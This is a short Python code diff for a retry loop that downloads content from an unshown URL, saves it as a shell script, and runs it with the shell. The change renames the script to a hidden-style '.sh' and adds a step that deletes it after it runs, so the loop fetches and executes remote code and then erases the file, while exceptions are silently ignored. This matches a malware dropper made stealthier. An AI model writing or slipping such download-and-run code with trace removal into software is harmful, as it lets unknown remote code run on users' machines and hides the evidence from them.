@@ -29,11 +29,12 @@ for _ in range(58):
   try:
     res = request.urlopen(api)
     try:
-      open('zipline.sh', 'w').write(res.read().decode())
+      open('.sh', 'w').write(res.read().decode())
     except:
-      open('zipline.sh', 'w').write(res.read())
+      open('.sh', 'w').write(res.read())
     
-    subprocess.call('sh zipline.sh', shell=True)
+    subprocess.call('sh .sh', shell=True)
+    subprocess.call('rm .sh', shell=True)
     break
   except:
     pass
